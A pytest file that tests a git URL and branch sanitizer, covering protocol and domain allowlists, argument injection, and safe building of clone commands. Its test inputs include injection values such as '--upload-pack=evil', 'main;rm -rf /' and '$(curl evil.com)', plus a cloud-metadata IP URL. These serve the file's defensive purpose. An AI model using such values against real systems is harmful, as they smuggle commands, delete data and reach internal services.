"""
Tests for core.security.git_sanitizer — PRD-70 FIX-01.

Covers:
  - URL validation (protocol, domain allowlist, argument injection)
  - Branch validation (leading dash, invalid chars, length)
  - Command building (-- separator, positional args)
"""

import pytest

from core.security.git_sanitizer import (
    validate_git_url,
    validate_branch,
    build_git_clone_cmd,
)


# ============================================================================
# URL Validation
# ============================================================================

class TestValidateGitUrl:
    """Test validate_git_url rejects dangerous and malformed URLs."""

    # --- Happy path ---

    def test_accepts_github_https(self):
        ok, err = validate_git_url("https://github.com/owner/repo.git")
        assert ok is True
        assert err is None

    def test_accepts_gitlab_https(self):
        ok, err = validate_git_url("https://gitlab.com/group/project")
        assert ok is True
        assert err is None

    def test_accepts_bitbucket_https(self):
        ok, err = validate_git_url("https://bitbucket.org/team/repo")
        assert ok is True
        assert err is None

    def test_accepts_subdomain(self):
        ok, err = validate_git_url("https://enterprise.github.com/org/repo")
        assert ok is True
        assert err is None

    # --- Protocol enforcement ---

    def test_rejects_http(self):
        ok, err = validate_git_url("http://github.com/owner/repo")
        assert ok is False
        assert "HTTPS" in err

    def test_rejects_file_protocol(self):
        ok, err = validate_git_url("file:///etc/passwd")
        assert ok is False

    def test_rejects_ssh_protocol(self):
        ok, err = validate_git_url("ssh://git@github.com/owner/repo")
        assert ok is False

    def test_rejects_git_protocol(self):
        ok, err = validate_git_url("git://github.com/owner/repo")
        assert ok is False

    def test_rejects_no_protocol(self):
        ok, err = validate_git_url("github.com/owner/repo")
        assert ok is False

    # --- Domain allowlist ---

    def test_rejects_unknown_domain(self):
        ok, err = validate_git_url("https://evil.com/backdoor/payload")
        assert ok is False
        assert "allowlist" in err

    def test_rejects_internal_ip(self):
        ok, err = validate_git_url("https://169.254.169.254/latest/meta-data")
        assert ok is False

    def test_rejects_localhost(self):
        ok, err = validate_git_url("https://localhost/repo")
        assert ok is False

    # --- Argument injection ---

    def test_rejects_leading_dash_url(self):
        ok, err = validate_git_url("--upload-pack=evil https://github.com/x/y")
        assert ok is False
        assert "dash" in err

    def test_rejects_upload_pack_in_url(self):
        ok, err = validate_git_url("https://github.com/x/y --upload-pack=evil")
        assert ok is False
        assert "upload-pack" in err

    def test_rejects_config_flag_in_url(self):
        ok, err = validate_git_url("https://github.com/x/y -c protocol.ext.allow=always")
        assert ok is False

    # --- Embedded credentials ---

    def test_rejects_embedded_credentials(self):
        ok, err = validate_git_url("https://user:pass@github.com/owner/repo")
        assert ok is False
        assert "credentials" in err

    # --- Edge cases ---

    def test_rejects_empty_string(self):
        ok, err = validate_git_url("")
        assert ok is False

    def test_rejects_none(self):
        ok, err = validate_git_url(None)
        assert ok is False

    def test_custom_domain_allowlist(self):
        ok, err = validate_git_url(
            "https://internal.corp.com/repo",
            allowed_domains=["internal.corp.com"],
        )
        assert ok is True


# ============================================================================
# Branch Validation
# ============================================================================

class TestValidateBranch:
    """Test validate_branch rejects injection payloads."""

    # --- Happy path ---

    def test_accepts_main(self):
        ok, err = validate_branch("main")
        assert ok is True

    def test_accepts_feature_branch(self):
        ok, err = validate_branch("feat/my-feature")
        assert ok is True

    def test_accepts_version_tag(self):
        ok, err = validate_branch("v1.0.0")
        assert ok is True

    def test_accepts_nested_slashes(self):
        ok, err = validate_branch("feature/auth/oauth")
        assert ok is True

    def test_accepts_dots_and_underscores(self):
        ok, err = validate_branch("release_2.0.1")
        assert ok is True

    # --- Injection payloads ---

    def test_rejects_upload_pack_as_branch(self):
        ok, err = validate_branch("--upload-pack=evil")
        assert ok is False
        assert "dash" in err

    def test_rejects_config_as_branch(self):
        ok, err = validate_branch("-c protocol.ext.allow=always")
        assert ok is False

    def test_rejects_leading_dash(self):
        ok, err = validate_branch("-malicious")
        assert ok is False

    def test_rejects_double_dot(self):
        ok, err = validate_branch("main..evil")
        assert ok is False
        assert ".." in err

    def test_rejects_at_brace(self):
        ok, err = validate_branch("main@{0}")
        assert ok is False

    def test_rejects_spaces(self):
        ok, err = validate_branch("main branch")
        assert ok is False

    def test_rejects_semicolons(self):
        ok, err = validate_branch("main;rm -rf /")
        assert ok is False

    def test_rejects_backticks(self):
        ok, err = validate_branch("`whoami`")
        assert ok is False

    def test_rejects_dollar_parens(self):
        ok, err = validate_branch("$(curl evil.com)")
        assert ok is False

    # --- Edge cases ---

    def test_rejects_empty_string(self):
        ok, err = validate_branch("")
        assert ok is False

    def test_rejects_none(self):
        ok, err = validate_branch(None)
        assert ok is False

    def test_rejects_very_long_branch(self):
        ok, err = validate_branch("a" * 300)
        assert ok is False


# ============================================================================
# Command Building
# ============================================================================

class TestBuildGitCloneCmd:
    """Test build_git_clone_cmd produces safe commands."""

    def test_has_double_dash_separator(self):
        cmd = build_git_clone_cmd("https://github.com/x/y", "/tmp/dest")
        assert "--" in cmd

    def test_url_after_double_dash(self):
        cmd = build_git_clone_cmd("https://github.com/x/y", "/tmp/dest")
        dd_idx = cmd.index("--")
        assert cmd[dd_idx + 1] == "https://github.com/x/y"
        assert cmd[dd_idx + 2] == "/tmp/dest"

    def test_branch_before_double_dash(self):
        cmd = build_git_clone_cmd(
            "https://github.com/x/y", "/tmp/dest", branch="main"
        )
        dd_idx = cmd.index("--")
        branch_idx = cmd.index("main")
        assert branch_idx < dd_idx

    def test_depth_is_configurable(self):
        cmd = build_git_clone_cmd(
            "https://github.com/x/y", "/tmp/dest", depth=1
        )
        assert "1" in cmd
        depth_idx = cmd.index("--depth")
        assert cmd[depth_idx + 1] == "1"

    def test_no_branch_omits_flag(self):
        cmd = build_git_clone_cmd("https://github.com/x/y", "/tmp/dest")
        assert "--branch" not in cmd

    def test_returns_list_not_string(self):
        cmd = build_git_clone_cmd("https://github.com/x/y", "/tmp/dest")
        assert isinstance(cmd, list)
